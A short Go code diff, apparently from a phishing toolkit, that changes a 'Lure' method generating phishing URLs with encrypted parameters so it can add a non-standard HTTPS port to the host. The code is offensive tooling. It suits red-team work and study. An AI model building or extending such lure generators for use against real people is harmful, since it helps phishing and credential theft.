@@ -6,6 +6,7 @@ import (
 	"crypto/rand"
 	"encoding/base64"
 	"errors"
+	"fmt"
 	"io"
 	"regexp"
 	"strings"
@@ -70,10 +71,13 @@ func (l *Lure) CompileUA() error {
 
 // GenerateURL builds the phishing URL, optionally embedding AES-256-GCM encrypted
 // custom parameters as a base64url query value.
-func (l *Lure) GenerateURL(baseDomain string, params map[string]string) (string, error) {
+func (l *Lure) GenerateURL(baseDomain string, httpsPort int, params map[string]string) (string, error) {
 	host := l.Hostname
 	if host == "" {
 		host = baseDomain
+	}
+	if httpsPort != 0 && httpsPort != 443 {
+		host = fmt.Sprintf("%s:%d", host, httpsPort)
 	}
 	base := "https://" + host + l.Path
 	if len(params) == 0 || len(l.ParamsKey) == 0 {
